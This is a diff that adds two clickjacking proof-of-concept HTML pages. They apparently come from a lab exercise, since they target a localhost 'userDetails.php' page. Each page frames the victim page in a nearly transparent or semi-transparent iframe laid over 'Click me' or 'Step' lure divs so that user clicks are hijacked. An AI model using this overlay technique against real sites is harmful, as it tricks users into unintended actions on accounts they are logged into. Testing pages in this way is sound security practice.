@@ -1,0 +1,81 @@
+<style>
+#clickjacking1 {
+position:relative;
+top:50%;
+left:50%;
+z-index:1;
+}
+#clickjacking2 {
+top:50%;
+left:50%;
+position:relative;
+}
+iframe {
+position:absolute;
+z-index:2;
+opacity:0.01;
+}
+</style>
+
+<iframe id="bottom-victim"
+src="http://localhost:30000/userDetails.php">
+</iframe>
+<div id="clickjacking1">Click me first</div>
+<div id="clickjacking2">Click me next</div>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Div and Iframe Overlay</title>
+<style>
+
+  iframe {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 2;
+    border: none;
+    opacity: 50%
+  }
+
+  .center-div1 {
+    position: absolute;
+    top: 63%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1;
+    text-align: center;
+    padding: 20px;
+  }
+
+  .center-div2 {
+    position: absolute;
+    top: 55%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1;
+    text-align: center;
+    padding: 20px;
+  }
+</style>
+</head>
+<body>
+
+<iframe src="http://localhost:30000/userDetails.php"></iframe>
+
+<div id="clickjacking1" class="center-div1">
+  Step-1
+</div>
+
+<div id="clickjacking2" class="center-div2">
+  Step-2
+</div>
+
+</body>
+</html>
